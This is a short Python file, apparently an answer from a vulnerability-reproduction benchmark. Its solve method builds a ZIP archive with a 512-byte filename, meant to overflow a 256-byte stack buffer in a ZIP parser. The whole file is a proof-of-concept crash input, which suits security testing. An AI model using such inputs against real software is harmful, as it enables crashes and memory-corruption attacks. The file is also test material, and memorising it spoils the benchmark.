import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_data = io.BytesIO()
        with zipfile.ZipFile(poc_data, 'w', zipfile.ZIP_STORED) as zf:
            # The vulnerability is a stack buffer overflow in a 256-byte buffer
            # used for the filename. We create a ZIP entry with a filename 
            # length of 512 bytes to trigger the overflow.
            payload = "A" * 512
            zf.writestr(payload, b"")
        return poc_data.getvalue()
